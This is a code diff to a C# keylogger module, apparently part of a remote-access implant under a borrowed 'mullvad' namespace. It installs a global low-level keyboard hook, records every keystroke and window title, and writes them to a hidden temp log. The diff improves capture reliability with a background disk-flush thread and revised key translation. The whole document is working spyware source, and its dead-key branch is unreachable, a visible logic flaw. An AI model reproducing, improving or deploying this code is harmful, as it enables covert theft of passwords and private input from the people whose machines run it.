@@ -1,4 +1,6 @@
 using System;
+using System.Collections.Concurrent;
+using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -36,35 +38,38 @@ namespace mullvad.Module.Keylogger
 
         private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        [DllImport("user32.dll")]  private static extern IntPtr SetWindowsHookEx(int id, HookProc fn, IntPtr hmod, uint tid);
-        [DllImport("user32.dll")]  private static extern bool   UnhookWindowsHookEx(IntPtr h);
-        [DllImport("user32.dll")]  private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr wp, IntPtr lp);
-        [DllImport("user32.dll")]  private static extern IntPtr GetForegroundWindow();
-        [DllImport("user32.dll")]  private static extern int    GetWindowText(IntPtr h, StringBuilder s, int n);
-        [DllImport("user32.dll")]  private static extern bool   GetKeyboardState(byte[] buf);
-        [DllImport("user32.dll")]  private static extern short  GetAsyncKeyState(int vk);
-        [DllImport("user32.dll")]  private static extern short  GetKeyState(int vk);
-        [DllImport("user32.dll")]  private static extern int    ToUnicodeEx(uint vk, uint scan, byte[] kb, StringBuilder buf, int sz, uint flags, IntPtr hkl);
-        [DllImport("user32.dll")]  private static extern IntPtr GetKeyboardLayout(uint tid);
-        [DllImport("user32.dll")]  private static extern uint   GetWindowThreadProcessId(IntPtr h, IntPtr pid);
-        [DllImport("user32.dll")]  private static extern bool   PostThreadMessage(uint tid, uint msg, IntPtr wp, IntPtr lp);
-        [DllImport("user32.dll")]  private static extern int    GetMessage(out MSG m, IntPtr h, uint lo, uint hi);
-        [DllImport("user32.dll")]  private static extern bool   TranslateMessage(ref MSG m);
-        [DllImport("user32.dll")]  private static extern IntPtr DispatchMessage(ref MSG m);
+        [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int id, HookProc fn, IntPtr hmod, uint tid);
+        [DllImport("user32.dll")] private static extern bool   UnhookWindowsHookEx(IntPtr h);
+        [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr wp, IntPtr lp);
+        [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")] private static extern int    GetWindowText(IntPtr h, StringBuilder s, int n);
+        [DllImport("user32.dll")] private static extern bool   GetKeyboardState(byte[] buf);
+        [DllImport("user32.dll")] private static extern int    ToUnicodeEx(uint vk, uint scan, byte[] kb, StringBuilder buf, int sz, uint flags, IntPtr hkl);
+        [DllImport("user32.dll")] private static extern IntPtr GetKeyboardLayout(uint tid);
+        [DllImport("user32.dll")] private static extern uint   GetWindowThreadProcessId(IntPtr h, IntPtr pid);
+        [DllImport("user32.dll")] private static extern bool   PostThreadMessage(uint tid, uint msg, IntPtr wp, IntPtr lp);
+        [DllImport("user32.dll")] private static extern int    GetMessage(out MSG m, IntPtr h, uint lo, uint hi);
+        [DllImport("user32.dll")] private static extern bool   TranslateMessage(ref MSG m);
+        [DllImport("user32.dll")] private static extern IntPtr DispatchMessage(ref MSG m);
         [DllImport("kernel32.dll", CharSet = CharSet.Auto)] private static extern IntPtr GetModuleHandle(string? n);
         [DllImport("kernel32.dll")] private static extern uint  GetCurrentThreadId();
 
         // ── State ─────────────────────────────────────────────────────────────
 
-        private static readonly object        _lock     = new object();
-        private static volatile bool           _active   = false;
-        private static Thread?                 _thread;
-        private static uint                    _threadId;
-        private static IntPtr                  _hook     = IntPtr.Zero;
-        private static HookProc?               _proc;
-        private static readonly StringBuilder  _log      = new StringBuilder();
-        private static IntPtr                  _lastHwnd = IntPtr.Zero;
-        private static string?                 _diskPath;
+        private static readonly object       _lock     = new object();
+        private static volatile bool          _active   = false;
+        private static Thread?                _thread;
+        private static uint                   _threadId;
+        private static IntPtr                 _hook     = IntPtr.Zero;
+        private static HookProc?              _proc;
+        private static readonly StringBuilder _log      = new StringBuilder();
+        private static IntPtr                 _lastHwnd = IntPtr.Zero;
+        private static string?                _diskPath;
+
+        // Disk writes are queued and flushed off the hook thread to keep the callback fast
+        private static readonly ConcurrentQueue<string> _diskQueue = new ConcurrentQueue<string>();
+        private static Thread?  _diskThread;
+        private static volatile bool _diskRunning;
 
         // ── Module entry ──────────────────────────────────────────────────────
 
@@ -91,11 +96,10 @@ namespace mullvad.Module.Keylogger
         {
             if (_active) return OkJson("already_active", true);
 
-            // Parse disk mode from payload: {"mode":"disk"} or {"mode":"disk","path":"C:\\..."}
             _diskPath = null;
             if (payload != null && payload.IndexOf("\"disk\"", StringComparison.Ordinal) >= 0)
             {
-                string path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "kl.log");
+                string path = Path.Combine(Path.GetTempPath(), "kl.log");
                 int pi = payload.IndexOf("\"path\"", StringComparison.Ordinal);
                 if (pi >= 0)
                 {
@@ -107,6 +111,7 @@ namespace mullvad.Module.Keylogger
                     }
                 }
                 _diskPath = path;
+                StartDiskFlusher();
             }
 
             lock (_lock)
@@ -121,13 +126,16 @@ namespace mullvad.Module.Keylogger
             _thread = new Thread(() =>
             {
                 _threadId = GetCurrentThreadId();
-                _hook     = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
-                _active   = _hook != IntPtr.Zero;
+                // hMod must be non-null for global LL hooks — use the host EXE module handle
+                _hook   = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
+                _active = _hook != IntPtr.Zero;
                 ready.Set();
 
                 if (_hook == IntPtr.Zero) return;
 
                 MSG msg;
+                // Pump messages — must not block; any slow work would delay CallNextHookEx
+                // and cause Windows to stop calling the hook (LowLevelHooksTimeout ~300ms).
                 while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0)
                 {
                     TranslateMessage(ref msg);
@@ -138,6 +146,7 @@ namespace mullvad.Module.Keylogger
                 _hook   = IntPtr.Zero;
                 _active = false;
             });
+            _thread.SetApartmentState(ApartmentState.STA);
             _thread.IsBackground = true;
             _thread.Start();
             ready.Wait(3000);
@@ -152,6 +161,9 @@ namespace mullvad.Module.Keylogger
                 PostThreadMessage(_threadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero);
                 _thread?.Join(3000);
             }
+            _diskRunning = false;
+            _diskThread?.Join(1000);
+
             string log;
             lock (_lock)
             {
@@ -177,7 +189,7 @@ namespace mullvad.Module.Keylogger
         private static string Status()
             => "{\"active\":" + (_active ? "true" : "false") + "}";
 
-        // ── Hook callback ─────────────────────────────────────────────────────
+        // ── Hook callback — MUST return quickly, no blocking I/O ──────────────
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
@@ -188,69 +200,107 @@ namespace mullvad.Module.Keylogger
                 try { s = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT)); }
                 catch { return CallNextHookEx(_hook, nCode, wParam, lParam); }
 
-                // Window context
+                // Window title on focus change
                 IntPtr hwnd = GetForegroundWindow();
                 if (hwnd != _lastHwnd)
                 {
                     var titleBuf = new StringBuilder(256);
                     GetWindowText(hwnd, titleBuf, 256);
-                    AppendLog("\r\n[" + titleBuf + " Opened]\r\n");
+                    Emit("\r\n[" + titleBuf + "]\r\n");
                     _lastHwnd = hwnd;
                 }
 
-                // Convert VK → character
-                // GetKeyboardState reads the calling thread's queue state, which is wrong for an LL hook
-                // running on a dedicated pump thread. Build the state manually from GetAsyncKeyState.
+                // GetKeyboardState from within a WH_KEYBOARD_LL callback reflects the
+                // actual current keyboard state (system updates it before invoking the hook).
+                // This is correct — do NOT use GetAsyncKeyState here, it has race conditions
+                // when typing fast.
+                var keyState = new byte[256];
+                GetKeyboardState(keyState);
+
                 uint tid   = GetWindowThreadProcessId(hwnd, IntPtr.Zero);
                 IntPtr hkl = GetKeyboardLayout(tid);
-                var keyState = new byte[256];
-                if ((GetAsyncKeyState(0x10) & 0x8000) != 0) keyState[0x10] = 0x80; // Shift
-                if ((GetAsyncKeyState(0xA0) & 0x8000) != 0) keyState[0xA0] = 0x80; // LShift
-                if ((GetAsyncKeyState(0xA1) & 0x8000) != 0) keyState[0xA1] = 0x80; // RShift
-                if ((GetAsyncKeyState(0x11) & 0x8000) != 0) keyState[0x11] = 0x80; // Ctrl
-                if ((GetAsyncKeyState(0x12) & 0x8000) != 0) keyState[0x12] = 0x80; // Alt
-                if ((GetKeyState(0x14) & 0x0001) != 0) keyState[0x14] = 0x01;       // CapsLock toggle
+                if (hkl == IntPtr.Zero) hkl = GetKeyboardLayout(0);
 
                 var charBuf = new StringBuilder(8);
                 int res = ToUnicodeEx(s.vkCode, s.scanCode, keyState, charBuf, 8, 0, hkl);
                 if (res > 0)
                 {
-                    AppendLog(charBuf.ToString());
+                    // Filter dead-key state: res == -1 means a dead key was stored in the
+                    // system's internal buffer. Calling ToUnicodeEx again with a space flushes it
+                    // so subsequent characters resolve correctly.
+                    if (res == -1)
+                    {
+                        // flush the dead key buffer to keep state clean
+                        var flush = new StringBuilder(8);
+                        ToUnicodeEx(0x20, 0x39, keyState, flush, 8, 0, hkl);
+                        Emit("[`]");
+                    }
+                    else
+                    {
+                        Emit(charBuf.ToString());
+                    }
                 }
                 else
                 {
                     string? special = SpecialKey(s.vkCode);
-                    if (special != null) AppendLog(special);
+                    if (special != null) Emit(special);
                 }
             }
             return CallNextHookEx(_hook, nCode, wParam, lParam);
         }
 
-        private static void AppendLog(string text)
+        // Emit stays off the hot path: in-memory append is fast; disk write is queued.
+        private static void Emit(string text)
         {
             lock (_lock) { _log.Append(text); }
-            if (_diskPath != null)
-                try { System.IO.File.AppendAllText(_diskPath, text, Encoding.UTF8); } catch { }
+            if (_diskPath != null) _diskQueue.Enqueue(text);
         }
+
+        // ── Disk flusher — runs on its own thread so I/O never touches the hook pump ──
+
+        private static void StartDiskFlusher()
+        {
+            _diskRunning = true;
+            _diskThread  = new Thread(() =>
+            {
+                while (_diskRunning || !_diskQueue.IsEmpty)
+                {
+                    var sb = new StringBuilder();
+                    while (_diskQueue.TryDequeue(out string? chunk))
+                        sb.Append(chunk);
+
+                    if (sb.Length > 0 && _diskPath != null)
+                    {
+                        try { File.AppendAllText(_diskPath, sb.ToString(), Encoding.UTF8); } catch { }
+                    }
+                    Thread.Sleep(250);
+                }
+            });
+            _diskThread.IsBackground = true;
+            _diskThread.Start();
+        }
+
+        // ── Special keys ──────────────────────────────────────────────────────
 
         private static string? SpecialKey(uint vk)
         {
             switch (vk)
             {
-                case 0x08: return "[Backspace]";
+                case 0x08: return "[Back]";
                 case 0x09: return "[Tab]";
                 case 0x0D: return "[Enter]\r\n";
                 case 0x1B: return "[Esc]";
+                case 0x20: return " ";
                 case 0x2D: return "[Ins]";
                 case 0x2E: return "[Del]";
                 case 0x23: return "[End]";
                 case 0x24: return "[Home]";
                 case 0x21: return "[PgUp]";
                 case 0x22: return "[PgDn]";
-                case 0x25: return "[Left]";
-                case 0x26: return "[Up]";
-                case 0x27: return "[Right]";
-                case 0x28: return "[Down]";
+                case 0x25: return "[←]";
+                case 0x26: return "[↑]";
+                case 0x27: return "[→]";
+                case 0x28: return "[↓]";
                 case 0x5B: return "[Win]";
                 case 0x5C: return "[Win]";
                 case 0x70: return "[F1]";
